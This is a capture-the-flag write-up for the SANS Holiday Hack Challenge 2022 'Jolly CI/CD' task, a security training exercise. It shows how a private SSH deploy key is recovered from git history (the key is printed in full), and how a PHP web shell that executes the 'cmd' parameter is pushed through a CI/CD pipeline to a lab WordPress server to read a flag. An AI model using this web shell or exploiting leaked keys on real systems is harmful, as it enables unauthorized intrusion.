# SANS Holiday Hack Challenge 2022 - KringleCon V: Golden Rings
## Recover the Elfen Ring
### Jolly CI/CD
Difficulty: :christmas_tree::christmas_tree::christmas_tree::christmas_tree::christmas_tree:  
Exploit a CI/CD pipeline. Get hints for this challenge from Tinsel Upatree in the Elfen Ring.

#### Hints
##### Commiting to Mistakes
*From: Tinsel Upatree*  
The thing about Git is that every step of development is accessible – even steps you didn't mean to take! `git log` can show code skeletons.
##### Switching Hats
*From: Tinsel Upatree*  
If you find a way to impersonate another identity, you might try re-cloning a repo with their credentials.

#### Solution
Speaking with Tinsel, he admits he mistakenly committed something on the repo at http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git, so I cloned it. Knowing that a mistake was committed, I went through the git logs identifying an interesting commit called `whoops`:
```bash
grinchum-land:~/wordpress.flag.net.internal$ git log
commit 37b5d575bf81878934adb937a4fff0d32a8da105
Author: knee-oh <sporx@kringlecon.com>
Date:   Wed Oct 26 13:58:15 2022 -0700

    updated wp-config

commit a59cfe83522c9aeff80d49a0be2226f4799ed239
Author: knee-oh <sporx@kringlecon.com>
Date:   Wed Oct 26 12:41:05 2022 -0700

    update gitlab.ci.yml

commit a968d32c0b58fd64744f8698cbdb60a97ec604ed
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 16:43:48 2022 -0700

    test

commit 7093aad279fc4b57f13884cf162f7d80f744eea5
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 15:08:14 2022 -0700

    add gitlab-ci

commit e2208e4bae4d41d939ef21885f13ea8286b24f05
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 13:43:53 2022 -0700

    big update

commit e19f653bde9ea3de6af21a587e41e7a909db1ca5
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 13:42:54 2022 -0700

    whoops

commit abdea0ebb21b156c01f7533cea3b895c26198c98
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 13:42:13 2022 -0700

    added assets

commit a7d8f4de0c594a0bbfc963bf64ab8ac8a2f166ca
Author: knee-oh <sporx@kringlecon.com>
Date:   Mon Oct 24 17:32:07 2022 -0700

    init commit
```
Assuming `whoops` either introduces or fixes the issue, I `diff`-ed it with previous and subsequent commits, identifying a private ssh key was removed:
```bash
grinchum-land:~/wordpress.flag.net.internal$ git diff abdea0ebb21b156c01f7533cea3b895c26198c98 e19f653bde9ea3de6af21a587e41e7a909db1ca5 | cat
diff --git a/.ssh/.deploy b/.ssh/.deploy
deleted file mode 100644
index 3f7a9e3..0000000
--- a/.ssh/.deploy
+++ /dev/null
@@ -1,7 +0,0 @@
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
-9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
-AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
-PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
------END OPENSSH PRIVATE KEY-----
diff --git a/.ssh/.deploy.pub b/.ssh/.deploy.pub
deleted file mode 100644
index 8c0b43c..0000000
--- a/.ssh/.deploy.pub
+++ /dev/null
@@ -1 +0,0 @@
-ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri
sporx@kringlecon.com
```
I tried connecting to the `gitlab.flag.net.internal` and `wordpress.flag.net.internal` host using the obtained credential but that was unsuccessful. I then noticed the file `.gitlab-ci.yml` inside the repository, which provides the commands that are executed on commit:
```bash
grinchum-land:~/wordpress.flag.net.internal$ cat .gitlab-ci.yml
stages:
	- deploy

deploy-job:
	stage: deploy
	environment: production
	script:
		- rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html
```
I tried committing a change to the `index.php` file that ended unsuccessful as I was missing the credentials. Having the private key for user `sprox@kringlecon.com`, I tried re-cloning the repo via SSH using that credential:
```bash
grinchum-land:~$ mkdir ~/.ssh
grinchum-land:~$ echo "-----BEGIN OPENSSH PRIVATE KEY-----" >> ~/.ssh/id_rsa
grinchum-land:~$ echo "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW" >> ~/.ssh/id_rsa
grinchum-land:~$ echo "QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5" >> ~/.ssh/id_rsa
grinchum-land:~$ echo "9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g" >> ~/.ssh/id_rsa
grinchum-land:~$ echo "AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot" >> ~/.ssh/id_rsa
grinchum-land:~$ echo "PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==" >> ~/.ssh/id_rsa
grinchum-land:~$ echo "-----END OPENSSH PRIVATE KEY-----" >> ~/.ssh/id_rsa
grinchum-land:~$ chmod 600 ~/.ssh/id_rsa
grinchum-land:~$ git clone git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git
The authenticity of host 'gitlab.flag.net.internal (172.18.0.150)' can t be established.
ED25519 key fingerprint is SHA256:jW9axa8onAWH+31D5iHA2BYliy2AfsFNaqomfCzb2vg.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'gitlab.flag.net.internal' (ED25519) to the list of known hosts.
Cloning into 'wordpress.flag.net.internal'...
remote: Enumerating objects: 10195, done.
remote: Total 10195 (delta 0), reused 0 (delta 0), pack-reused 10195
Receiving objects: 100% (10195/10195), 36.49 MiB | 20.88 MiB/s, done.
Resolving deltas: 100% (1799/1799), done.
Updating files: 100% (9320/9320), done.
```
I wrote a short PHP code that would execute commands received over the `cmd` GET parameter:
```php
<?php
	$output=null;
	$retval=null;
	exec ($_GET["cmd"], $output, $retval);
	echo "OUTPUT --> ";
	print_r($output);
	echo "\nRETVAL --> $retval";
?>
```
Then I substituted the original `index.php` with a one-liner version of that php script, committed and verified it was working:
```bash
grinchum-land:~/wordpress.flag.net.internal$ echo '<?php $output=null; $retval=null; exec ($_GET["cmd"], $output, $retval); echo "OUTPUT --> "; print_r($output); echo "\nRETVAL --> $retval"; ?>' > index.php
grinchum-land:~/wordpress.flag.net.internal$ git config --global user.email "you@example.com"
grinchum-land:~/wordpress.flag.net.internal$ git config --global user.name "Your Name"
grinchum-land:~/wordpress.flag.net.internal$ git add --all && git commit -m "$(date)" && git push
[main 7507011] Sun Jan 15 14:13:42 GMT 2023
 1 file changed, 1 insertion(+), 17 deletions(-)
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 2 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 373 bytes | 373.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
To gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git
   37b5d57..7507011  main -> main
grinchum-land:~/wordpress.flag.net.internal$ wget "wordpress.flag.net.internal?cmd=whoami" -q -O -
OUTPUT --> Array
(
	[0] => www-data
)
```
I then just literally searched for `flag` maybe because the word repeated quite a lot, found and read it:
```bash
grinchum-land:~/wordpress.flag.net.internal$ wget "wordpress.flag.net.internal?cmd=find /* 2>/dev/null | grep flag" -q -O -
OUTPUT --> Array
(
    [0] => /flag.txt
    [1] => /proc/sys/kernel/acpi_video_flags
    [2] => /proc/kpageflags
    [3] => /sys/devices/platform/serial8250/tty/ttyS0/flags
    [4] => /sys/devices/virtual/net/eth0/flags
    [5] => /sys/devices/virtual/net/lo/flags
    [6] => /sys/module/scsi_mod/parameters/default_dev_flags
    [7] => /usr/src/wordpress/wp-includes/images/icon-pointer-flag.png
    [8] => /usr/src/wordpress/wp-includes/images/icon-pointer-flag-2x.png
    [9] => /usr/include/x86_64-linux-gnu/asm/processor-flags.h
    [10] => /usr/include/x86_64-linux-gnu/bits/termios-c_iflag.h
    [11] => /usr/include/x86_64-linux-gnu/bits/waitflags.h
    [12] => /usr/include/x86_64-linux-gnu/bits/mman-map-flags-generic.h
    [13] => /usr/include/x86_64-linux-gnu/bits/termios-c_oflag.h
    [14] => /usr/include/x86_64-linux-gnu/bits/ss_flags.h
    [15] => /usr/include/x86_64-linux-gnu/bits/termios-c_lflag.h
    [16] => /usr/include/x86_64-linux-gnu/bits/termios-c_cflag.h
    [17] => /usr/include/linux/tty_flags.h
    [18] => /usr/include/linux/kernel-page-flags.h
    [19] => /usr/bin/dpkg-buildflags
    [20] => /usr/lib/x86_64-linux-gnu/perl/5.32.1/bits/waitflags.ph
    [21] => /usr/lib/x86_64-linux-gnu/perl/5.32.1/bits/ss_flags.ph
    [22] => /usr/share/dpkg/buildflags.mk
    [23] => /usr/local/lib/php/build/ax_check_compile_flag.m4
    [24] => /var/www/html/wp-content/uploads/2022/10/bowes_flag-1024x684.png
    [25] => /var/www/html/wp-content/uploads/2022/10/bowes_flag-2048x1367.png
    [26] => /var/www/html/wp-content/uploads/2022/10/bowes_flag-300x200.png
    [27] => /var/www/html/wp-content/uploads/2022/10/bowes_flag-600x401.png
    [28] => /var/www/html/wp-content/uploads/2022/10/bowes_flag-300x300.png
    [29] => /var/www/html/wp-content/uploads/2022/10/bowes_flag-220x154.png
    [30] => /var/www/html/wp-content/uploads/2022/10/bowes_flag.png
    [31] => /var/www/html/wp-content/uploads/2022/10/bowes_flag-100x100.png
    [32] => /var/www/html/wp-content/uploads/2022/10/bowes_flag-768x513.png
    [33] => /var/www/html/wp-content/uploads/2022/10/bowes_flag-150x150.png
    [34] => /var/www/html/wp-content/uploads/2022/10/bowes_flag-1536x1025.png
    [35] => /var/www/html/wp-content/plugins/woocommerce/packages/woocommerce-blocks/assets/js/settings/blocks/feature-flags.ts
    [36] => /var/www/html/wp-includes/images/icon-pointer-flag.png
    [37] => /var/www/html/wp-includes/images/icon-pointer-flag-2x.png
)

RETVAL --> 0
```
```bash
grinchum-land:~/wordpress.flag.net.internal$ wget "wordpress.flag.net.internal?cmd=cat /flag.txt" -q -O -
OUTPUT --> Array
(
    [0] => 
    [1] =>                         Congratulations! You've found the HHC2022 Elfen Ring!
    [2] => 
    [3] => 
    [4] =>                                         ░░░░            ░░░░
    [5] =>                                 ░░                              ░░░░
    [6] =>                             ░░                                      ░░░░
    [7] =>                                                                         ░░
    [8] =>                       ░░                                                  ░░░░
    [9] =>                                                                               ░░
    [10] =>                                       ░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░                  ░░
    [11] =>                                   ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░                ░░
    [12] =>                               ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒                ░░
    [13] =>                           ░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓░░              ▓▓▓▓▓▓▓▓▒▒░░░░            ░░░░
    [14] =>           ░░            ░░▒▒▓▓▓▓▓▓▓▓                            ▓▓▓▓▓▓▒▒░░            ░░░░
    [15] =>                       ░░▒▒▓▓▓▓▓▓                                    ▓▓▒▒▒▒░░          ░░░░
    [16] =>                       ▒▒▓▓▓▓▓▓                                        ▓▓▓▓▒▒░░          ░░░░
    [17] =>       ░░            ▒▒▓▓▓▓▓▓                                            ▓▓▒▒░░░░        ░░░░▒▒
    [18] =>                   ░░▒▒▓▓▓▓░░                                            ░░▒▒▒▒░░░░      ░░░░▒▒
    [19] =>                   ░░▓▓▓▓▓▓                                                ▓▓▒▒░░░░      ░░░░▒▒
    [20] =>     ░░            ▒▒▓▓▓▓                                                    ▒▒░░░░        ░░▒▒▒▒
    [21] =>     ░░          ░░▓▓▓▓▓▓                                                    ▒▒▒▒░░░░      ░░▒▒▒▒
    [22] =>     ░░          ▒▒▓▓▓▓                                                        ▒▒░░░░      ░░▒▒▒▒
    [23] =>                 ▒▒▓▓▓▓                                                        ▒▒░░░░░░    ░░▒▒▒▒
    [24] =>   ░░          ░░▓▓▓▓▒▒                                                        ▒▒░░░░░░    ░░▒▒▒▒▓▓
    [25] =>   ░░          ▒▒▓▓▓▓                                                            ░░░░░░░░  ░░▒▒▒▒▓▓
    [26] =>   ░░          ▒▒▓▓▓▓                                                            ░░░░░░░░  ░░▒▒▒▒▓▓
    [27] =>   ░░          ▒▒▓▓▓▓               oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT             ░░░░░░░░  ░░▒▒▒▒▓▓
    [28] =>   ░░░░        ▒▒▓▓▓▓                                                            ░░░░  ░░░░░░▒▒▒▒▓▓
    [29] =>   ░░░░        ▒▒▓▓▓▓                                                            ░░    ░░░░▒▒▒▒▒▒▓▓
    [30] =>   ▒▒░░        ▒▒▓▓▓▓                                                            ░░    ░░░░▒▒▒▒▒▒▓▓
    [31] =>   ▒▒░░░░      ▒▒▓▓▓▓                                                            ░░    ░░░░▒▒▒▒▒▒▓▓
    [32] =>   ▓▓░░░░      ░░▓▓▓▓▒▒                                                        ░░      ░░░░▒▒▒▒▓▓▓▓
    [33] =>     ▒▒░░        ▒▒▓▓▓▓                                                        ░░    ░░░░▒▒▒▒▒▒▓▓
    [34] =>     ▒▒░░░░      ░░▓▓▓▓                                                        ░░    ░░░░▒▒▒▒▓▓▓▓
    [35] =>     ▓▓▒▒░░      ░░▒▒▓▓▓▓                                                    ░░      ░░▒▒▒▒▒▒▓▓▓▓
    [36] =>     ▓▓▒▒░░░░      ▒▒▒▒▓▓                                                          ░░░░▒▒▒▒▒▒▓▓▓▓
    [37] =>       ▒▒▒▒░░░░    ▒▒▒▒▒▒▒▒                                                        ░░▒▒▒▒▒▒▒▒▓▓
    [38] =>       ▓▓▒▒░░░░    ░░░░▒▒▒▒▓▓                                            ░░      ░░░░▒▒▒▒▒▒▓▓▓▓
    [39] =>         ▒▒▒▒░░░░    ░░▒▒▒▒▒▒▒▒                                        ░░      ░░░░▒▒▒▒▒▒▒▒▓▓
    [40] =>           ▓▓▒▒░░░░  ░░░░░░░░▒▒▓▓                                    ░░      ░░░░▒▒▒▒▒▒▓▓▓▓
    [41] =>           ▓▓▓▓▒▒░░░░░░░░░░░░░░▒▒▒▒▓▓                            ░░        ░░░░▒▒▒▒▒▒▓▓▓▓▓▓
    [42] =>             ▓▓▓▓▒▒░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒                ░░░░          ░░░░▒▒▒▒▒▒▓▓▓▓▓▓
    [43] =>               ▓▓▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                ░░░░▒▒▒▒▒▒▓▓▓▓▓▓
    [44] =>                 ▓▓▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░                        ░░░░▒▒▒▒▒▒▒▒▒▒▓▓▓▓
    [45] =>                   ▓▓▓▓▓▓▒▒▒▒░░░░░░░░░░░░░░░░              ░░░░░░░░▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓
    [46] =>                     ▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓
    [47] =>                       ██▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓██
    [48] =>                           ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██
    [49] =>                             ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████
    [50] =>                                 ████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████████
    [51] =>                                 ░░░░░░░░▓▓██████████████████░░░░░░░░
)

RETVAL --> 0
```
The solution is the string `oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT` in the above output.

---
## Recover the Elfen Ring
### Clone with a Difference
### Prison Escape
### The Elfen Ring
## Recover the Web Ring
### Naughty IP
### Credential Mining
### 404 FTW
### IMDS, XXE, and Other Abbreviations
### Open Boria Mine Door
### Glamtariel's Fountain
### The Web Ring
## Recover the Cloud Ring
### AWS CLI Intro
### Trufflehog Search
### Exploitation via AWS CLI
## Recover the Burning Ring of Fire
### Buy a Hat
### Blockchain Divination
### Exploit a Smart Contract
### Mistakes were made... the key
### The Burning Ring of Fire
## [Narrative](/README.md#narrative)
## [Conclusions](/README.md#conclusions)
### [The Victors shop](/README.md#the-victors-shop)
### [Inbox (1)](/README.md#inbox-1)
---
## [thedead@dellian:~$ whoami](/README.md#thedeaddellian-whoami)
## KringleCon Orientation
## Recover the Tolkien Ring